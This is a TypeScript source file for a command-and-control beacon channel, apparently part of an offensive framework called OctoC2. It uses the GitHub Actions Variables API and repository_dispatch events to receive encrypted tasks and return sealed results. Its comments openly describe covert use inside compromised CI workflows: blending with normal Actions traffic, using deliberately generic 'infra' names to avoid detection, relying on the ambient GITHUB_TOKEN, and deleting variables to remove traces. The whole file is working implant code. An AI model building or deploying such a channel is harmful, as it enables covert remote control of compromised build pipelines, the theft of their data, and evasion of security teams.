/**
 * OctoC2 — ActionsTentacle  (Tentacle 3 — GitHub Actions dispatch channel)
 *
 * ────────────────────────────────────────────────────────────────────────────
 * Channel Overview
 * ────────────────────────────────────────────────────────────────────────────
 *
 * GitHub Actions provides two event-based dispatch mechanisms that this
 * channel exploits as a covert C2 transport:
 *
 *   1. repository_dispatch  — caller-initiated event sent via the REST API.
 *      POST /repos/{owner}/{repo}/dispatches
 *      Body: { event_type: string, client_payload: object }
 *
 *   2. workflow_dispatch    — manual trigger of a named workflow file.
 *      POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches
 *      Body: { ref: string, inputs: object }
 *
 * The beacon uses (1) to register itself and to deliver results.
 * The server uses (2) to inject task blobs into a running workflow that
 * then executes the beacon binary, OR writes an encrypted task blob to a
 * GitHub Variable (Actions Variables API) that the beacon polls for.
 *
 * ────────────────────────────────────────────────────────────────────────────
 * Why This Channel Is Valuable
 * ────────────────────────────────────────────────────────────────────────────
 *
 * A beacon embedded in a CI/CD workflow (e.g. injected via a compromised
 * action or dependency) blends perfectly into the normal stream of Actions
 * traffic.  Security teams rarely instrument Actions logs for anomalous
 * API calls, and the channel generates no inbound network connections to
 * the target host — only outbound HTTPS calls to api.github.com.
 *
 * Key stealth properties:
 *   • Each beacon call looks like a normal CI step making GitHub API calls.
 *   • repository_dispatch events are common in monorepo workflows.
 *   • No persistent connection, port, or listener is required on the beacon.
 *   • The GITHUB_TOKEN provided to every Actions job is sufficient for dispatch
 *     within the same repository (no operator-supplied PAT needed on the
 *     beacon side for same-repo operations).
 *
 * ────────────────────────────────────────────────────────────────────────────
 * Simplified Variables-only Protocol
 * ────────────────────────────────────────────────────────────────────────────
 *
 * All communication flows through GitHub Actions Variables API:
 *
 *   ACK:     INFRA_STATUS_{ID8}  = JSON({ k: pubkey, t: ts })   (beacon writes)
 *   Tasks:   INFRA_JOB_{ID8}    = base64(encryptBox(Task[]))   (server writes)
 *   Results: INFRA_RESULT_{TASKID8} = sealedB64                (beacon writes)
 *
 * Variable names use first 8 chars of the beacon ID / task ID for brevity.
 *
 * As a belt-and-suspenders measure, the beacon also sends a
 * `repository_dispatch` with event_type "infra-sync" on its first checkin.
 * This is useful for server-side logging but is NOT required for operation.
 *
 * ────────────────────────────────────────────────────────────────────────────
 * Rate Limits
 * ────────────────────────────────────────────────────────────────────────────
 *
 * GitHub imposes the following limits relevant to this channel:
 *
 *   • repository_dispatch: 10 events / hour per authenticated user per repo
 *     (GitHub Enterprise may have higher limits).
 *   • Variables API reads: counts against the general REST API rate limit
 *     (5,000 req/hour for authenticated calls with a PAT;
 *      1,000 req/hour for GITHUB_TOKEN within an Actions job).
 *
 * Implication: the ACK dispatch fires only on the first checkin (not every
 * poll cycle).  Subsequent task polls use the Variables API only.
 *
 * ────────────────────────────────────────────────────────────────────────────
 * GITHUB_TOKEN vs PAT
 * ────────────────────────────────────────────────────────────────────────────
 *
 * GITHUB_TOKEN (the automatic token injected into every Actions job):
 *   • Can trigger `repository_dispatch` and `workflow_dispatch` ONLY within
 *     the same repository where the job is running.
 *   • Cannot trigger events in a different repository — the API returns 403.
 *   • Expires when the job finishes.
 *   • No scopes to configure — GitHub grants it automatically.
 *
 * PAT (Personal Access Token):
 *   • Can trigger dispatch events in ANY repository the token owner has
 *     write access to — including a separate operator-controlled C2 repo.
 *   • Required when the beacon's C2 `repo` differs from the runner's repo.
 *   • Long-lived but revocable; should be treated as a credential.
 *
 * This channel uses `config.token` (which may be a GITHUB_TOKEN or PAT
 * depending on how the beacon was deployed).  When `GITHUB_TOKEN` is the
 * ambient env var the channel is automatically available; the token value
 * is expected to already be loaded into `config.token` by the caller.
 *
 * ────────────────────────────────────────────────────────────────────────────
 * Security Model
 * ────────────────────────────────────────────────────────────────────────────
 *
 *   • Variable values are plaintext in the API response, so ALL payloads
 *     MUST be encrypted / sealed before storage.
 *   • Task blobs are encrypted (crypto_box, beacon pubkey).
 *   • Result blobs are sealed (crypto_box_seal, operator pubkey).
 *   • `infra-sync` and `infra-update` are deliberately generic event names
 *     chosen to blend with infrastructure automation workflows.
 *   • The `k` / `r` payload keys use short aliases to reduce log noise and
 *     avoid obvious field names like `publicKey` or `result`.
 */

import { BaseTentacle } from "./BaseTentacle.ts";
import { createLogger } from "../logger.ts";
import {
  decryptBox, sealBox,
  bytesToBase64,
} from "../crypto/sodium.ts";
import type { CheckinPayload, Task, TaskResult } from "../types.ts";

const log = createLogger("ActionsTentacle");

export class ActionsTentacle extends BaseTentacle {
  readonly kind = "actions" as const;

  private ackSent = false;

  // ── Identity helpers ─────────────────────────────────────────────────────────

  // GitHub Variables API normalizes names to uppercase, so id8 must be
  // uppercased to match what the server sees when reading ACK variables.
  private get id8(): string { return this.config.id.slice(0, 8).toUpperCase(); }

  private get ackVarName(): string  { return `INFRA_STATUS_${this.id8}`; }
  private get taskVarName(): string { return `INFRA_JOB_${this.id8}`; }

  private get owner(): string { return this.config.repo.owner; }
  private get repo(): string  { return this.config.repo.name; }

  // ── Static availability gate ────────────────────────────────────────────────

  /**
   * Returns true when the `GITHUB_TOKEN` environment variable is present and
   * non-empty.  This is a synchronous, pure env-check — no network calls.
   *
   * `GITHUB_TOKEN` is automatically injected by the GitHub Actions runner into
   * every job execution context.  Its presence is the canonical signal that
   * the beacon is running inside a GitHub Actions workflow.
   *
   * Note: a PAT stored in a secret named `GITHUB_TOKEN` would also satisfy
   * this check — which is acceptable, since the channel is available in both
   * cases.
   */
  static isActionsAvailable(): boolean {
    return Boolean(process.env["GITHUB_TOKEN"]?.trim());
  }

  // ── Availability ────────────────────────────────────────────────────────────

  /**
   * Delegates to the static env check so the tentacle is only active when
   * running inside a GitHub Actions workflow.  Never throws — any exception
   * is swallowed and returns false.
   */
  override async isAvailable(): Promise<boolean> {
    try {
      return ActionsTentacle.isActionsAvailable();
    } catch {
      return false;
    }
  }

  // ── Checkin ─────────────────────────────────────────────────────────────────

  /**
   * 1. On first call: write ACK variable `INFRA_STATUS_{ID8}` = { k: pubkey, t: ts }
   *    and fire a belt-and-suspenders `repository_dispatch` with event_type "infra-sync".
   * 2. On all calls: GET `INFRA_JOB_{ID8}` variable.
   *    - If absent (404): return [].
   *    - If present: base64-decode → JSON parse { nonce, ciphertext } → decryptBox
   *      → parse Task[] → delete variable → return tasks.
   */
  async checkin(payload: CheckinPayload): Promise<Task[]> {
    // 1. First-call ACK registration
    if (!this.ackSent) {
      const pubKeyB64 = await bytesToBase64(this.config.beaconKeyPair.publicKey);
      const ackValue  = JSON.stringify({ k: pubKeyB64, t: payload.checkinAt });

      // Write ACK variable (create or update)
      try {
        // Try update first; fall back to create on 404
        await this.octokit.rest.actions.updateRepoVariable({
          owner: this.owner, repo: this.repo,
          name:  this.ackVarName,
          value: ackValue,
        });
      } catch (err: any) {
        if (err?.status === 404) {
          await this.octokit.rest.actions.createRepoVariable({
            owner: this.owner, repo: this.repo,
            name:  this.ackVarName,
            value: ackValue,
          });
        }
        // Other errors are swallowed — ACK is best-effort, not fatal
      }

      // Belt-and-suspenders: also fire repository_dispatch "infra-sync"
      try {
        await (this.octokit.rest as any).repos.createDispatchEvent({
          owner:          this.owner,
          repo:           this.repo,
          event_type:     "infra-sync",
          client_payload: { k: pubKeyB64, t: payload.checkinAt },
        });
      } catch { /* best-effort */ }

      this.ackSent = true;
    }

    // 2. Poll for task variable
    let rawValue: string;
    try {
      const resp = await this.octokit.rest.actions.getRepoVariable({
        owner: this.owner,
        repo:  this.repo,
        name:  this.taskVarName,
      });
      rawValue = resp.data.value?.trim() ?? "";
      if (!rawValue) return [];
      log.info(`Found task variable ${this.taskVarName} (${rawValue.length} bytes)`);
    } catch (err: any) {
      if (err?.status === 404) return [];
      throw err;
    }

    // 3. Decrypt
    let tasks: Task[];
    try {
      const envelope = JSON.parse(rawValue) as { nonce: string; ciphertext: string };
      const plainBytes = await decryptBox(
        envelope.ciphertext,
        envelope.nonce,
        this.config.operatorPublicKey,
        this.config.beaconKeyPair.secretKey,
      );
      tasks = JSON.parse(new TextDecoder().decode(plainBytes)) as Task[];
    } catch (decryptErr) {
      log.warn(`Task variable decryption failed: ${(decryptErr as Error).message}`);
      return [];
    }

    // 4. Delete task variable (prevents re-delivery)
    try {
      await this.octokit.rest.actions.deleteRepoVariable({
        owner: this.owner,
        repo:  this.repo,
        name:  this.taskVarName,
      });
    } catch { /* best-effort */ }

    return tasks;
  }

  // ── Submit result ────────────────────────────────────────────────────────────

  /**
   * 1. sealBox(JSON.stringify(result), operatorPublicKey) → sealedB64
   * 2. Write variable `INFRA_RESULT_{TASKID8}` = sealedB64
   */
  async submitResult(result: TaskResult): Promise<void> {
    const sealed    = await sealBox(JSON.stringify(result), this.config.operatorPublicKey);
    const taskId8   = result.taskId.slice(0, 8).toUpperCase();
    const varName   = `INFRA_RESULT_${taskId8}`;

    try {
      await this.octokit.rest.actions.updateRepoVariable({
        owner: this.owner, repo: this.repo,
        name:  varName,
        value: sealed,
      });
    } catch (err: any) {
      if (err?.status === 404) {
        await this.octokit.rest.actions.createRepoVariable({
          owner: this.owner, repo: this.repo,
          name:  varName,
          value: sealed,
        });
      } else {
        throw err;
      }
    }
  }

  // ── Teardown ─────────────────────────────────────────────────────────────────

  /**
   * Best-effort cleanup: delete `INFRA_JOB_{ID8}` and `INFRA_STATUS_{ID8}`
   * variables if they exist.  No throw on error.
   */
  override async teardown(): Promise<void> {
    for (const varName of [this.taskVarName, this.ackVarName]) {
      try {
        await this.octokit.rest.actions.deleteRepoVariable({
          owner: this.owner,
          repo:  this.repo,
          name:  varName,
        });
      } catch { /* best-effort */ }
    }
  }
}
